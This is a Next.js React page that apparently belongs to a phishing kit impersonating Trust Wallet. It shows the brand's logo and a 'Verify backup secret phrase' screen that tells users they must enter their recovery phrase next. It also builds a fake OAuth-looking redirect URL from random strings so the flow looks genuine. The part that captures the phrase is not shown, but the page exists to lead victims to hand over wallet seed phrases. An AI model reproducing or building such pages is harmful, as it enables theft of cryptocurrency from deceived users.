'use client'

import { useState, useEffect, useCallback } from 'react'
import Link from 'next/link'
import TrustLogo from './TrustLogo'
import TrustStats from '../components/stars'
import Footer from '../components/footer'

function generateRandomString(length: number) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length))
  }
  return result
}

export default function VerifyBackup() {
  const [dynamicUrl, setDynamicUrl] = useState('')
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    const clientId = generateRandomString(32)
    const redirectUri = encodeURIComponent("https://account.trustwallet.com/oauth-connect")
    const state = `v2.local.${generateRandomString(16)}.${generateRandomString(48)}`
    const options = encodeURIComponent("login account.trustwallet.com")

    const url = `/verify/clientlogin?url=/api/1/login/oauth/provider/pending` +
      `&client_id=${clientId}` +
      `&redirect_uri=${redirectUri}` +
      `&state=${state}` +
      `&options=${options}`

    setDynamicUrl(url)
  }, [])

  const handleProceed = useCallback((e: React.MouseEvent<HTMLAnchorElement>) => {
    e.preventDefault()
    setIsLoading(true)
    setTimeout(() => {
      window.location.href = dynamicUrl
    }, 1000)
  }, [dynamicUrl])

  return (
    <div className="mt-12 flex flex-col items-center justify-center px-4">
      <TrustLogo />
      <div className="mt-14 max-w-lg rounded-lg border border-[#575757] px-8 py-4 text-center">
        <h2 className="scroll-m-20 text-4xl font-medium tracking-tight lg:text-2xl text-white">Verify backup secret phrase</h2>
        <h5 className="mt-2 leading-7 text-[#8C8C8C] font-regular">When you initialised the wallet, you will have received a backup phrase. This phrase helps keep your wallet safe in event of destruction of your device or corruption of data. You will be required to enter the phrase in order to verify it in the next step.</h5>
        <div className="mt-6 flex items-center rounded-xl border border-[#48FF91] p-2 space-x-1"> 
          <TrustLogo />
          <h4 className="text-sm text-[#48FF91] font-regular">If you have not received it, please open your wallet, and there should be a large backup banner on top.</h4>
        </div>
        <div className="mt-4 h-0.5 w-full bg-white opacity-40"></div>
        <div className="mt-8 flex justify-between px-2 pb-4">
          <Link href="/" className="rounded-3xl border border-[#48FF91] bg-[#1B1B1C] px-10 py-2 text-[#48FF91]">
            Cancel
          </Link>
          <Link 
            href={dynamicUrl} 
            onClick={handleProceed}
            className="rounded-3xl bg-[#48FF91] px-10 py-2 text-[#1B1B1C] relative flex items-center justify-center"
          >
            <span className={`transition-opacity duration-200 ${isLoading ? 'opacity-0' : 'opacity-100'}`}>
              Proceed
            </span>
            <div
              className={`w-5 h-5 border-2 border-[#1B1B1C] border-t-transparent rounded-full animate-spin absolute ${
                isLoading ? 'opacity-100' : 'opacity-0'
              }`}
            ></div>
          </Link>
          
        </div>
        
      </div>
      <TrustStats />
      <Footer />
    </div>
  )
}

